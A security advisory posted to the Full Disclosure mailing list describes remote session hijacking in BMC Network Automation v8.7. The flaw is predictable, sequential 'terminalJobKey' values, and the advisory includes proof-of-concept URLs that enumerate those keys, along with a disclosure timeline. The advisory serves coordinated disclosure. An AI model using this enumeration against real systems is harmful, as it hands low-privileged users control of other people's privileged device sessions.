
Date: Wed, 2 Jan 2019 22:49:42 +1100
From: Filip Palian <s3810@...stk.edu.pl>
To: fulldisclosure@...lists.org
Subject: [FD] BMC Network Automation v8.7 - remote session hijacking.

Hejkum kejkum,

Intro:
The BMC Network Automation allows authenticated users to hijack
established remote sessions of other users, version v8.7.00.000 b383
u038 was confirmed to be vulnerable.

Details:
Authenticated users of the BMC Network Automation web application with
assigned “viewer” role are able to hijack SSH/Telnet sessions
initiated by other, privileged users.
In order to hijack an established session, the only requirement is to
obtain a valid "terminalJobKey" of that session.
A valid "terminalJobKey" can be obtained through enumeration of the
possible values.
This process is aided by the fact that the format of the
"terminalJobKey" is known and newly generated values are sequential
thus predictable.
The format of a "terminalJobKey" was found to be DDDDDDDDD-DDDDDD,
where "D" is a digit from 0-9 range.
The vulnerable application was found to increment the value of
"terminalJobKey" parameter by one (1) at the last position for each
newly initiated remote session.

Proof of Concept:
1. Privileged user initiates an SSH connection and a new terminal
window is opened with the following sample URL, e.g.:
https://host:9443//bca-networks/network/displayTerminalWindows.do?method=openTeraminal&terminalJobKey=9123465678-183094&deviceName=127.0.0.1

2. In the next step a non-privileged user enumerates "terminalJobKey"
values until he finds a valid one and is able to hijack the already
established session:
https://host:9443//bca-networks/network/displayTerminalWindows.do?method=openTeraminal&terminalJobKey=9123465678-183091&deviceName=127.0.0.1
https://host:9443//bca-networks/network/displayTerminalWindows.do?method=openTeraminal&terminalJobKey=9123465678-183092&deviceName=127.0.0.1
https://host:9443//bca-networks/network/displayTerminalWindows.do?method=openTeraminal&terminalJobKey=9123465678-183093&deviceName=127.0.0.1
https://host:9443//bca-networks/network/displayTerminalWindows.do?method=openTeraminal&terminalJobKey=9123465678-183094&deviceName=127.0.0.1

Remediation:
Contact vendor directly for remediation guidance.

Timeline:
07.11.2018: Email detailing discovered issue sent to BMC at appsec@....com.
08.11.2018: BMC confirms receipt of the report.
21.11.2018: Follow-up email sent to BMC asking for status.
10.12.2018: Follow-up email sent to BMC informing that the security
advisory will be published in the next following weeks.
02.01.2019: The advisory has been released.


Cheers,
Filip Palian

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/